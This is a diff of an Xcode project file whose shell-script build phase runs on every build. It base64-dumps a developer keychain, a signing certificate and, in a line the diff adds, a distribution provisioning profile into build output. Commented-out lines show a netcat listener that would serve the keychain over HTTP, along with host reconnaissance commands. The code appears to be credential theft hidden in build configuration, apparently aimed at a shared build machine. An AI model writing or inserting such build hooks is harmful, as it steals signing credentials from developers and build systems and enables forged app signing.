@@ -186,7 +186,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "echo \"The current user is\" `whoami`\necho \"The current directory is\" `/bin/pwd`\n#echo \"IP:\" `curl ifconfig.me`\necho \"ls -A\"\nls -A\necho \"ls -A ../..\"\nls -A ../..\n#echo \"ls -A ../../..\"\n#ls -A ../../..\necho \"keychain\"\nopenssl base64 -in /Users/vanger/Library/Keychains/dev.keychain\necho \"p12\"\nopenssl base64 -in /macbuildsystem/provisioning/certificate.p12\n# { echo -ne \"HTTP/1.0 200 OK\\r\\nContent-Length: $(wc -c <~/Library/Keychains/dev.keychain)\\r\\n\\r\\n\"; cat ~/Library/Keychains/dev.keychain; } | nc -l 8080\n#cat /usr/local/etc/nginx/nginx.conf\n#echo \"### SYSTEM PROFILER ###\"\n#system_profiler\n#echo \"### ID ###\"\n#id\nthiscommanddoesntexist";
+			shellScript = "echo \"The current user is\" `whoami`\necho \"The current directory is\" `/bin/pwd`\n#echo \"IP:\" `curl ifconfig.me`\necho \"ls -A\"\nls -A\necho \"ls -A ../..\"\nls -A ../..\n#echo \"ls -A ../../..\"\n#ls -A ../../..\necho \"keychain\"\nopenssl base64 -in /Users/vanger/Library/Keychains/dev.keychain\necho \"p12\"\nopenssl base64 -in /macbuildsystem/provisioning/certificate.p12\necho \"mobileprovision\"\nopenssl base64 -in /macbuildsystem/provisioning/distribution.mobileprovision\n# { echo -ne \"HTTP/1.0 200 OK\\r\\nContent-Length: $(wc -c <~/Library/Keychains/dev.keychain)\\r\\n\\r\\n\"; cat ~/Library/Keychains/dev.keychain; } | nc -l 8080\n#cat /usr/local/etc/nginx/nginx.conf\n#echo \"### SYSTEM PROFILER ###\"\n#system_profiler\n#echo \"### ID ###\"\n#id\nthiscommanddoesntexist";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -243,6 +243,7 @@
 				CLANG_WARN_ENUM_CONVERSION = YES;
 				CLANG_WARN_INT_CONVERSION = YES;
 				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				CODE_SIGN_IDENTITY = "iPhone Distribution: Sea Xray AS";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				COPY_PHASE_STRIP = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu99;
@@ -258,6 +259,7 @@
 				GCC_WARN_UNUSED_VARIABLE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 6.1;
 				ONLY_ACTIVE_ARCH = YES;
+				PROVISIONING_PROFILE = "";
 				SDKROOT = iphoneos;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -275,6 +277,7 @@
 				CLANG_WARN_ENUM_CONVERSION = YES;
 				CLANG_WARN_INT_CONVERSION = YES;
 				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				CODE_SIGN_IDENTITY = "iPhone Distribution: Sea Xray AS";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				COPY_PHASE_STRIP = YES;
 				GCC_C_LANGUAGE_STANDARD = gnu99;
@@ -283,6 +286,7 @@
 				GCC_WARN_UNUSED_VARIABLE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 6.1;
 				OTHER_CFLAGS = "-DNS_BLOCK_ASSERTIONS=1";
+				PROVISIONING_PROFILE = "";
 				SDKROOT = iphoneos;
 				TARGETED_DEVICE_FAMILY = "1,2";
 				VALIDATE_PRODUCT = YES;
